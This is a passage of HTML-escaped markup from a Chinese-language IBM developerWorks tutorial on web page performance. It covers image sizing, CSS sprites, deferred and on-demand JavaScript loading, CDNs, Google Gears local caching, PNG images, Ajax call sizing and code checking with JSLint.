href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;118&quot;&gt;&lt;a name=&quot;setimagesize&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;设置图像大小&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;与表格单元格、行和列一样，当您未明确设置图像大小时，浏览器需要执行计算来显示图像，这会降低处理速度。此外，在某些情形下，图像大小的计算结果可能不正确，因此图像会发生变形。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;119&quot;&gt;&lt;a name=&quot;cssimage&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;将 CSS 图像映射用于装饰功能&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;120&quot;&gt;使用图像映射代替多个图像，这是另一种缩短加载时间的方式，因为同时下载图像的各个独立部分能够加快整个页面的下载进度。或者，您可以使用某种名为 &lt;em&gt;CSS sprites&lt;/em&gt; 的工具（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）。CSS sprites 可帮助减少 HTTP 请求的数量。一个图像可以包含装饰或布置页面所需的所有图像元素。您使用 CSS 来选择（通过调用某些位置和维度）用于特定元素的映射。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;121&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;122&quot;&gt;&lt;a name=&quot;delayload&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;尽可能延迟脚本加载&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;123&quot;&gt;我 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#jojs&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;在前面&lt;/font&gt;&lt;/a&gt; 提到过，移除完全不需要的 JavaScript 代码能够加快加载和处理速度。但是如果代码已经非常精简并且必须在页面中包含 JavaScript 代码的话，该怎么办？&lt;/p&gt;\r\n&lt;p&gt;在这种情形下，一种提升页面下载速度的潜在方式是将脚本放在页面的底部，使页面加载更迅速。通常，浏览器只能（从同一个域）下载不超过两个并行对象，如果一个对象是一段 JavaScript 代码，那么在该脚本下载完之前，其他页面组件的下载将会暂停。如果将 JavaScript 代码放在页面底部，（在大多数情况下）它将在最后下载，这时所有其他组件都已下载完。&lt;/p&gt;\r\n&lt;p&gt;使用 Firebug 扩展跟踪加载缓慢的文件，我敢打赌您的 JavaScript 文件是下载最慢的文件。压缩 JavaScript 文件会有所帮助，但是仅仅这样可能还不够。您可以使用以下代码片段延迟 JavaScript 的加载： &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;var delay = 5;setTimeout(&quot;heavy();&quot;, delay * 1000);&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;这段代码将对 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;heavy()&lt;/font&gt;&lt;/code&gt; 方法的调用延迟了 5 秒。您可以将这段代码与下面的技巧结合使用来延迟整个 JavaScript 文件的加载。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;124&quot;&gt;&lt;a name=&quot;loadondemand&quot;&gt;&lt;span class=&quot;smalltitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;3&quot;&gt;按需加载 JavaScript 文件&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;125&quot;&gt;要按需加载 JavaScript，使用 import() 函数，如 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list3&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 3&lt;/font&gt;&lt;/a&gt; 所示。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;list3&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 3. import() 函数&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				function $import(src){  var scriptElem = document.createElement(''script'');  scriptElem.setAttribute(''src'',src);  scriptElem.setAttribute(''type'',''text/javascript'');  document.getElementsByTagName(''head'')[0].appendChild(scriptElem);}// import with a random query parameter to avoid cachingfunction $importNoCache(src){  var ms = new Date().getTime().toString();  var seed = &quot;?&quot; + ms;   $import(src + seed);}&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;127&quot;&gt;&lt;a name=&quot;verifyload&quot;&gt;&lt;span class=&quot;smalltitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;3&quot;&gt;验证函数加载&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;128&quot;&gt;也可以验证一个函数是否被加载，如果没有，加载 JavaScript 文件。为此，使用 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list4&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 4&lt;/font&gt;&lt;/a&gt; 中的代码。 &lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;list4&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 4. 验证函数是否被加载&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				if (myfunction){  // The function has been loaded}else{ // Function has not been loaded yet, so load the javascript.  $import(''http://www.yourfastsite.com/myfile.js'');}&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;可以使用 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;defer&lt;/font&gt;&lt;/code&gt; 属性，但不是所有浏览器（包括 Firefox）都支持它。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;130&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;131&quot;&gt;&lt;a name=&quot;optimizecss&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;优化 CSS 文件&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;如果经过适当优化和维护，CSS 文件不一定很大。例如，具有很多独立类的 CSS 文件会影响下载速度。与 JavaScript 文件一样，您需要优化 CSS 文件，使其包含所需的所有内容，同时保持合理的大小。另外，使用外部文件代替内联定义来适应浏览器的缓存机制。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;132&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;133&quot;&gt;&lt;a name=&quot;cdn&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用内容分布网络&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;内容分布网络（Content-distribution network，CDN）是另一种缩短下载时间的好方法。当您将静态图像放在 Internet 上的许多服务器上时，用户能够从离他们最近的服务器下载这些图像。此外，大多数 CDN 都在快速服务器上运行，因此无论服务器的加载速度如何，其响应速度都比小型的超载服务器快。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;134&quot;&gt;&lt;a name=&quot;multipledomains&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;对资产使用多个域来增加连接&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;CDN 的另一个优势是它们是独立的域。因为您的浏览器将并发连接的数量限制到一个单一的域，因此无论何时加载一个页面，都很容易占满所有线程。因此，到其他资产的连接被延迟了。然而，您的浏览器能够打开新线程或到其他域的连接，这样，从另一个域加载的任何资产都可以与其他所有资产同时加载。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;135&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;136&quot;&gt;&lt;a name=&quot;gears&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;在合适的时候使用 Google Gears&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;137&quot;&gt;使用 Google Gears（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）是避免用户反复下载同一内容的另一种好方法。Gears 允许用户离线访问 Web 应用程序，但是也允许将页面元素持久化到用户的计算机上。因此，频繁加载但未进行更新的内容可以存储在 Gears 数据库中，该数据库是一个 SQLite3 关系数据库管理系统。对同一内容的所有 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;next&lt;/font&gt;&lt;/code&gt; 请求都可以从数据库（而不是服务器）直接加载。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;138&quot;&gt;安装 Gears 之后，获取 gears_init.js 文件，以便轻松访问 &lt;a href=&quot;http://code.google.com/apis/gears/gears_init.js&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;Gears 工厂和应用程序编程接口（API）&lt;/font&gt;&lt;/a&gt;，将其保存为 &lt;em&gt;gears_init.js&lt;/em&gt;，通过以下方式在您的代码中引用它：&lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;script type=&quot;text/javascript&quot; src=&quot;gears_init.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;139&quot;&gt;要确定是否已安装 Gears，使用 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list5&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 5&lt;/font&gt;&lt;/a&gt; 中的代码。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;list5&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 5. 确定是否已安装 Gears&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				&amp;lt;script&amp;gt;  if (!window.google || !google.gears) {    location.href = &quot;http://gears.google.com/?action=install&amp;amp;message=&amp;lt;welcome message&amp;gt;&quot;         + &quot;&amp;amp;return=&amp;lt;return url&amp;gt;&quot;;  }&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;如果未安装 Gears，代码将向您提供下载 Gears 的 URL。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;141&quot;&gt;当所有元素都通过验证并且 Gears 已安装之后，您可以测试 Gears 的极其有用的数据库功能，使用 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list6&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 6&lt;/font&gt;&lt;/a&gt; 中的 JavaScript 代码。 &lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;list6&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 6. 测试数据库功能&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				&amp;lt;script type=&quot;text/javascript&quot;&amp;gt; var db = google.gears.factory.create(''beta.db''); db.open(''database-test''); db.execute(''create table if not exists Test'' +           '' (Phrase text, Timestamp int)''); db.execute(''insert into Test values (?, ?)'', [''Monkey!'', new Date().getTime()]); var rs = db.execute(''select * from Test order by Timestamp desc''); while (rs.isValidRow()) {  alert(rs.field(0) + ''@'' + rs.field(1));  rs.next(); } rs.close();&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;这段代码在您的计算机或服务器上创建一个本地数据库 &lt;em&gt;db。&lt;/em&gt;如果表 &lt;em&gt;Test&lt;/em&gt; 不存在，则创建一个，然后插入测试数据（&lt;em&gt;Monkey!&lt;/em&gt; 和时间）。代码从数据库获取数据，并在浏览器中以警告的形式呈现出来。&lt;/p&gt;\r\n&lt;p&gt;想像一下可能发生的结果！&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;143&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;144&quot;&gt;&lt;a name=&quot;png&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用 PNG 格式的图像&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;Graphic Interchange Format (GIF) 和 Joint Photographic Experts Group (JPEG) 图像格式都已过时了：Portable Network Graphic (PNG) 是未来流行的格式。当然，您可以说 GIF 和 JPEG 已经消亡，或者 PNG 没有任何缺陷，但是所有事物都有各自的优缺点，PNG 以最佳的文件大小提供了出色的质量。因此，如果进行选择的话，应该尽可能使用 PNG 图像。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;145&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;146&quot;&gt;&lt;a name=&quot;shortajax&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;保持 Ajax 调用简短、准确&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;当统称为 Asynchronous JavaScript + XML (Ajax) 的技术在两年前出现时，这些技术为处理页面请求和响应提供了一种革命性方法。然而，拨号用户可能从来没机会体验其真正的优势，因为在许多情形下，Ajax 需要在浏览器与服务器之间大量通信。因此，如果您能够保持 Ajax 调用简短和准确，可以避免用户花费无止尽的时间来等待元素刷新或响应。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;147&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;148&quot;&gt;&lt;a name=&quot;oneajax&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;进行一次较大的 Ajax 调用并在本地处理客户机数据&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;149&quot;&gt;如果不能进行简短的 Ajax 调用，或者如果这些调用不能提供期望的结果，可以考虑一种替代方法：进行一次大的 Ajax 调用来获取所需的一切内容，然后让客户机在本地处理数据。通过这种方式，客户机只需等待一次（获取传入的数据），但是在此之后（当浏览器与服务器之间没有必要通信时），处理速度将更快。当然，还有大量 Ajax 优化技术，本教程无法一一列出。如果想要了解关于 Ajax 的更多信息，请查看 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;。 &lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;150&quot;&gt;&lt;a name=&quot;sandbox&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;在沙箱中测试代码&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;还有一个经常被遗忘的常用技巧。尽管清醒的 Web 开发人员通常会在启动应用程序之前对其进行测试，但是有时候测试会使他们不那么重视维护任务，或者新功能添加得太快，并且未经过充分考虑或测试。结果，余下的脚本减缓了应用程序的速度。&lt;/p&gt;\r\n&lt;p&gt;如果您添加一项新功能，可以首先在沙箱里（完全脱离了应用程序的其余部分）进行测试，查看它作为单个函数的行为。通过这种方式，您可以反复检查，并分析性能和响应时间，无需考虑 Web 应用程序的其余部分。然后，当新功能的行为符合预期时，可以将其引入到应用程序的其余部分中，运行其他测试，保证功能本身的行为符合预期。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;151&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;152&quot;&gt;&lt;a name=&quot;analyze&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;分析站点代码&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;153&quot;&gt;在许多场景中，自我反省是一个不错的建议。幸运的是，在开发过程中，我们可以使用工具来帮助反省，并尽可能客观地进行实践。像 JSLint（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资源&lt;/font&gt;&lt;/a&gt;）这样的工具的价值是无法衡量的，尽管其站点宣称它 “可能令您备受挫折”，因为它向您提供了所有的潜在代码缺陷，这些缺陷不但使调试更加困难，而且可能导致更长的响应时间。 &lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;154&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;155&quot;&gt;&lt;a name=&quot;jslint&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用 JSLint 检查 JavaScript 代码中的错误或糟糕的编码实践&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;您不需要像完美主义者那样追求完美无缺的 JavaScript 代码。但是，许多开发人员没有认真对待代码分析，通常在开发过程中跳过了这个步骤。不幸的是，错误和糟糕的编码实践不仅不太专业，而且可能减缓应用程序的速度。当浏览器忙于应付错误和糟糕的编码实践时，加载不仅需要更多时间，还会导致难以调试的错误。 &lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;156&quot;&gt;因此，如果想要获得良好的代码，可以考虑使用代码分析工具。有许多不同的工具可供使用，但是最适合 JavaScript 语言的工具非 JavaScript Lint 莫属，它也叫做 JSLint（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）。也可以使用 Firebug，但是 JSLint 更加正式，它包含在 YSlow 中。 &lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;157&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;158&quot;&gt;&lt;a name=&quot;orphans&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;检查孤立的文件和丢失的图像&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;检查孤立的文件和丢失的图像是一种明智之举。大部分 Web 开发人员都会检查错误的文件引用，但是这里仍然需要说明一下。丢失的文件容易引起各种问题，因为它们会导致 “The image/page cannot be displayed” 之类的错误消息。但是在网页速度优化方面，它们具有更大的缺陷：当浏览器寻找丢失的或孤立的文件时，它会消耗资源，这不可避免地会导致页面处理速度变慢。因此，请检查孤立或丢失的文件，包括拼写错误的文件名。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;159&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;160&quot;&gt;&lt;a name=&quot;YSlow&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;YSlow 